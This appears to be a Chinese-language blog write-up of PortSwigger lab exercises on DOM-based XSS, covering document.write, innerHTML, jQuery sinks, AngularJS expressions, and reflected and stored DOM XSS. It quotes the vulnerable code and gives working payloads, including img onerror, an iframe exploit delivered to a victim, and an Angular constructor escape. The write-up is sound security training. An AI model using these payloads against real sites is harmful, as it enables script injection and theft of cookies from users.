<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/resources/images/tracker.gif?searchTerms=&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727091921196.png" class="" title="image-20250727091921196">

<p>到此实验完成。</p>
<h3 id="基于document-write接收器的DOM-XSS-攻击，在select元素内利用location-search作为攻击源"><a href="#基于document-write接收器的DOM-XSS-攻击，在select元素内利用location-search作为攻击源" class="headerlink" title="基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源"></a>基于<code>document.write</code>接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</h3><h4 id="实验要求：-3"><a href="#实验要求：-3" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验在库存查询功能中存在一个基于DOM的XSS漏洞。该漏洞使用了JavaScript的document.write函数向页面写入数据，而该函数调用了来自location.search的可控数据（您可以通过网站URL控制此参数），这些数据被包裹在select元素内。</p>
<p>要完成本实验，请构造一个能逃逸select元素并执行alert函数的XSS攻击。</p>
<h4 id="实验过程：-3"><a href="#实验过程：-3" class="headerlink" title="实验过程："></a>实验过程：</h4><p>进入实验：</p>
<img src="/XSS/XSS/image-20250727094459612.png" class="" title="image-20250727094459612">

<p>点击View details按钮：</p>
<img src="/XSS/XSS/image-20250727094649167.png" class="" title="image-20250727094649167">

<p>可以检测库存，f12打开开发者工具，发现如下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Paris&quot;</span>,<span class="string">&quot;Milan&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> store = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;storeId&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(store) &#123;</span><br><span class="line">    <span class="comment">// store 存在 </span></span><br><span class="line">    <span class="comment">// 向页面写入 &#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;</span></span><br><span class="line">    <span class="comment">// 存在 XSS 漏洞</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;stores.<span class="property">length</span>;i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(stores[i] === store) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);                          </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">storeId=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727102626335.png" class="" title="image-20250727102626335">

<p>实验完成。</p>
<h3 id="基于location-search源通过innerHTML接收器触发的DOM型XSS漏洞"><a href="#基于location-search源通过innerHTML接收器触发的DOM型XSS漏洞" class="headerlink" title="基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞"></a>基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</h3><h4 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求:"></a>实验要求:</h4><p>本实验的博客搜索功能存在一个基于DOM的XSS漏洞。该漏洞通过<code>innerHTML</code>赋值操作，使用来自<code>location.search</code>的数据动态修改了div元素的HTML内容。</p>
<p>要完成本实验，请构造一个能够执行<code>alert</code>函数的跨站脚本攻击。</p>
<h4 id="实验过程：-4"><a href="#实验过程：-4" class="headerlink" title="实验过程："></a>实验过程：</h4><p>根据实验要求了解到，博客的搜索功能存在DOM型的XSS漏洞。</p>
<p>在搜索框中输入123：</p>
<img src="/XSS/XSS/image-20250727105438480.png" class="" title="image-20250727105438480">

<p>按f12，打开开发者工具：</p>
<img src="/XSS/XSS/image-20250727105608795.png" class="" title="image-20250727105608795">

<p>发现一段js代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doSearchQuery</span>(<span class="params">query</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchMessage&#x27;</span>).<span class="property">innerHTML</span> = query; <span class="comment">// 接收器 innerHTML</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="comment">// 攻击源</span></span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">    <span class="title function_">doSearchQuery</span>(query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>innerHTML 已经不在执行secript标签，我们要换一种形式执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;img src=1 onerror=alert(document.domain) /&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727110104657.png" class="" title="image-20250727110104657">

<p>src是路径，由于这是一个非法路径，img标签肯定会解析失败，解析失败触发onerror事件，执行alert函数。</p>
<h3 id="利用location-search攻击jQuery的a标签href属性导致的DOM型XSS漏洞"><a href="#利用location-search攻击jQuery的a标签href属性导致的DOM型XSS漏洞" class="headerlink" title="利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞"></a>利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</h3><h4 id="实验要求：-4"><a href="#实验要求：-4" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验在”用户反馈提交页面”存在一个基于DOM的XSS漏洞。该漏洞通过jQuery库的<code>$</code>选择器定位a标签，并利用<code>location.search</code>的数据动态修改其<code>href</code>属性。</p>
<p>要完成此实验，请构造攻击使页面中的”返回”链接被篡改，点击时触发<code>alert(document.cookie)</code>。</p>
<h4 id="实验过程：-5"><a href="#实验过程：-5" class="headerlink" title="实验过程："></a>实验过程：</h4><img src="/XSS/XSS/image-20250727114012736.png" class="" title="image-20250727114012736">

<p>在提交反馈界面存在DOM的XSS漏洞，点击Submit freeback，按F12，打开开发者工具：</p>
<img src="/XSS/XSS/image-20250727114159206.png" class="" title="image-20250727114159206">

<p>发现js代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#backLink&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;returnPath&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 将returnPath的值设置给href属性，href属性设置在id为#backLink的a标签中。</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727114615500.png" class="" title="image-20250727114615500">

<p>发送此链接：</p>
<img src="/XSS/XSS/image-20250727114711283.png" class="" title="image-20250727114711283">

<p>点击链接，触发alert(document.cookie)函数，实验完成。</p>
<h3 id="利用-hashchange-事件在-jQuery-选择器接收器中触发的-DOM-XSS-漏洞"><a href="#利用-hashchange-事件在-jQuery-选择器接收器中触发的-DOM-XSS-漏洞" class="headerlink" title="利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞"></a>利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</h3><h4 id="实验要求：-5"><a href="#实验要求：-5" class="headerlink" title="实验要求："></a>实验要求：</h4><p>“该实验在主页上存在一个基于 DOM 的跨站脚本（XSS）漏洞。它使用 jQuery 的 <code>$()</code> 选择器函数自动滚动到指定帖子，帖子标题通过 <code>location.hash</code> 属性传递。</p>
<p>要完成实验，需向受害者投递一个漏洞利用代码，在其浏览器中调用 <code>print()</code> 函数。”</p>
<h4 id="实验过程：-6"><a href="#实验过程：-6" class="headerlink" title="实验过程："></a>实验过程：</h4><p>进入实验环境，按f12打开开发者工具，进入源码：</p>
<img src="/XSS/XSS/image-20250728090148823.png" class="" title="image-20250728090148823">

<p><code>Ctrl+F</code> 搜索 <code>script</code> 。</p>
<img src="/XSS/XSS/image-20250728090350901.png" class="" title="image-20250728090350901">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">监听窗口的hashchange事件</span></span><br><span class="line"><span class="comment">window.location.hash 获取描点部分(# 及 # 以后的内容)</span></span><br><span class="line"><span class="comment">slice(start,end) 用于截取,不包含end</span></span><br><span class="line"><span class="comment">decodeURIComponent 用于url解码</span></span><br><span class="line"><span class="comment">$() 表示选择器，选择section元素中class的blog-list部分，在其中查找所有h2标签，使用:contains伪类选择器匹配包含指定文本的h2元素</span></span><br><span class="line"><span class="comment">scrollIntoView 将元素滚动到视口中</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250728091507536.png" class="" title="image-20250728091507536">

<p>比如我们输入#Passwords</p>
<img src="/XSS/XSS/image-20250728091718036.png" class="" title="image-20250728091718036">

<p>scrollIntoView就会跳转到<code> &lt;h2&gt;Passwords&lt;/h2&gt;</code>。</p>
<p>location.hash我们可以控制，我们输入恶意代码：<code>&lt;img src=1 onerror=print() /&gt;</code></p>
<p>$()会解析这段，并将img创建为DOM元素，scrollIntoView将创建好的DOM元素加入到DOM中并进行渲染触发XSS代码。</p>
<img src="/XSS/XSS/image-20250728092825188.png" class="" title="image-20250728092825188">

<p>现在就已经触发了print。</p>
<p>要完成实验的话，要进入：</p>
<img src="/XSS/XSS/image-20250728093827800.png" class="" title="image-20250728093827800">

<p>向body注入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0aaf001e041c2090a807a401006c0035.web-security-academy.net/#&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;this.src+=&#x27;&lt;img src=1 onerror=print() /&gt;&#x27;&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>store储存起来，然后将漏洞传递给受害者即可完成实验。</p>
<img src="/XSS/XSS/image-20250728093937822.png" class="" title="image-20250728093937822">

<p>第三个按钮。</p>
<h3 id="AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码"><a href="#AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码" class="headerlink" title="AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码"></a>AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</h3><h4 id="实验要求：-6"><a href="#实验要求：-6" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验在搜索功能中存在一个基于DOM的跨站脚本漏洞，漏洞位于AngularJS表达式中。</p>
<p>AngularJS是一个流行的JavaScript库，它会扫描包含ng-app属性（称为AngularJS指令）的HTML节点内容。当在HTML代码中添加该指令时，您可以在双大括号内执行JavaScript表达式。在尖括号被编码的情况下，这种技术特别有用。</p>
<p>要完成本实验，请发起一个跨站脚本攻击，执行AngularJS表达式并调用alert函数。</p>
<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程:"></a>实验过程:</h4><p>F12 打开开发这工具，进入源码：</p>
<img src="/XSS/XSS/image-20250728114042113.png" class="" title="image-20250728114042113">

<p>angular1.7.7。</p>
<img src="/XSS/XSS/image-20250728114151058.png" class="" title="image-20250728114151058">

<p>ng-app属性，可以在body内，通过模板语法：<code>&#123;&#123;&#125;&#125;</code>，进行JavaScript的代码执行，但是只能执行简单的表达式，我们可以通过constructor获取Function构造函数，执行任意表达式：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; $on.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$on angular的监听器</span></span><br><span class="line"><span class="comment">$on.constructor 获取 Function方法</span></span><br><span class="line"><span class="comment">(&#x27;alert(1)&#x27;)() 执行alert(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250728114641923.png" class="" title="image-20250728114641923">

<h3 id="反射型-DOM-XSS漏洞"><a href="#反射型-DOM-XSS漏洞" class="headerlink" title="反射型 DOM XSS漏洞"></a>反射型 DOM XSS漏洞</h3><h4 id="实验要求：-7"><a href="#实验要求：-7" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验演示了一种反射型DOM漏洞。当服务器端应用程序处理来自请求的数据并在响应中回显这些数据时，就会出现反射型DOM漏洞。页面上的脚本随后以不安全的方式处理这些被反射的数据，最终将其写入危险的接收器（dangerous sink）。</p>
<p>要解决该实验，需构造一个能调用alert()函数的注入攻击。</p>
<h4 id="实验过程：-7"><a href="#实验过程：-7" class="headerlink" title="实验过程："></a>实验过程：</h4><p>首页有一个搜索页面：</p>
<img src="/XSS/XSS/image-20250729092941883.png" class="" title="image-20250729092941883">

<p>输入内容123.</p>
<img src="/XSS/XSS/image-20250729093020885.png" class="" title="image-20250729093020885">

<p>按f12，打开开发者工具，进入源码位置。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/searchResults.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入了一个searchResults.js脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">search</span>(<span class="string">&#x27;search-results&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用了search函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;blog-header&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">/</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">placeholder</span>=<span class="string">&#x27;Search the blog...&#x27;</span> <span class="attr">name</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">class</span>=<span class="string">button</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟进searchResults.js脚本：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">path</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// 创建XMLHttpRequest对象</span></span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">            <span class="title function_">displaySearchResults</span>(searchResultsObj);</span><br><span class="line">        &#125; <span class="comment">// 定义了一个回调函数</span></span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>); <span class="comment">// 初始化请求</span></span><br><span class="line">    xhr.<span class="title function_">send</span>(); <span class="comment">// 发送数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>path: search-results 相对路径。</p>
<p>我们是在：<code>https://0a8e0086032fb0aa818e0dda00830017.web-security-academy.net/</code>发送请求的。</p>
<p>send发送数据，访问的是<code>https://0a8e0086032fb0aa818e0dda00830017.web-security-academy.net/search-results?search=123</code></p>
<p>我们访问一下，返回如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729094620108.png" class="" title="image-20250729094620108">

<p>xhr.responseText 返回：<code>&#39;&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;123&quot;&#125;&#39;</code>。</p>
<p>这是漏洞点：<code>eval(&#39;var searchResultsObj = &#39; + this.responseText);</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;; alert(&#x27;XSS&#x27;)//</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729095151425.png" class="" title="image-20250729095151425">

<p>对我们恶意闭合的双引号进行了转义，那我们再输入一个转义符号，让转义符号转义他自己。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;&#125;; alert(&#x27;XSS&#x27;);//</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729095350905.png" class="" title="image-20250729095350905">

<img src="/XSS/XSS/image-20250729095414229.png" class="" title="image-20250729095414229">

<h3 id="存储型-DOM-XSS漏洞"><a href="#存储型-DOM-XSS漏洞" class="headerlink" title="存储型 DOM XSS漏洞"></a>存储型 DOM XSS漏洞</h3><h4 id="实验要求：-8"><a href="#实验要求：-8" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验演示了博客评论功能中的一个存储型DOM漏洞。要完成实验，请利用此漏洞触发<code>alert()</code>函数。</p>
<h4 id="实验过程：-8"><a href="#实验过程：-8" class="headerlink" title="实验过程："></a>实验过程：</h4><p>实验要求告诉我们博客评论功能存在储存型DOM漏洞。</p>
<p>我们进入博客，进入一篇文章，按f12，进入源码，找到评论提交位置：</p>
<img src="/XSS/XSS/image-20250729135925123.png" class="" title="image-20250729135925123">

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/post/comment&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;XgRrRnk7KxSKyQDQMNY5fdag6SUrZ7vp&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;postId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Comment:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">&quot;12&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;300&quot;</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Website:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">pattern</span>=<span class="string">&quot;(http:|https:).+&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;website&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 前端有一个正则表达式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Post Comment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Ctrl+F，搜索<code>script</code>标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/loadCommentsWithVulnerableEscapeHtml.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">loadComments</span>(<span class="string">&#x27;/post/comment&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>58、59行；调用了一个函数loadComments，跟进loadCommentsWithVulnerableEscapeHtml.js脚本：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadComments</span>(<span class="params">postCommentPath</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();  </span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> comments = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>); <span class="comment">// 用JSON.parse可以修复上一题的漏洞</span></span><br><span class="line">            <span class="title function_">displayComments</span>(comments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, postCommentPath + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line"><span class="comment">// 上面这些内容没啥好说的。</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">escapeHTML</span>(<span class="params">html</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 这个有一个特性，我不知道的特性，就因为我不知道，导致这道题没有做出来，后面说。我先说说我当时的思路</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">displayComments</span>(<span 